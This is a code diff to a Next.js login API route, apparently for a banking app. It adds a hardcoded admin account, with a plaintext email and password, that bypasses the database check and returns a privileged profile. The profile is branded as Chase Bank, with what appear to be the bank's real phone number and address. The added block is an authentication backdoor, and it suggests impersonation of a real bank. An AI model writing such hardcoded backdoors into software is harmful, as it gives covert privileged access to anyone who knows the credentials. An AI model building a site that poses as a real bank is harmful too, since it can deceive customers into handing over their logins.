@@ -14,6 +14,44 @@ export async function POST(request: NextRequest) {
 
     const supabase = createServiceClient()
 
+    // Check for admin accounts first
+    const adminAccounts: { [key: string]: { password: string; full_name: string; balance: number } } = {
+      'admin@chasebank.com': {
+        password: 'ChaseAdmin2024',
+        full_name: 'Chase Bank',
+        balance: 100000,
+      },
+    }
+
+    if (adminAccounts[email]) {
+      const adminAccount = adminAccounts[email]
+      if (password === adminAccount.password) {
+        const adminProfile = {
+          id: 'admin-chase-bank',
+          email: email,
+          username: 'chasebank_admin',
+          full_name: adminAccount.full_name,
+          phone: '+1-866-935-9935',
+          address: '270 Park Avenue, New York, NY 10017',
+          member_since: '2020-01-15',
+          tier: 'admin',
+          account_number: 'ADMIN-0001',
+          balance: adminAccount.balance,
+          is_admin: true,
+        }
+
+        return NextResponse.json({
+          success: true,
+          user: adminProfile,
+        })
+      } else {
+        return NextResponse.json(
+          { error: 'Invalid email or password' },
+          { status: 401 }
+        )
+      }
+    }
+
     // Query user from database
     const { data: user, error: userError } = await supabase
       .from('users')
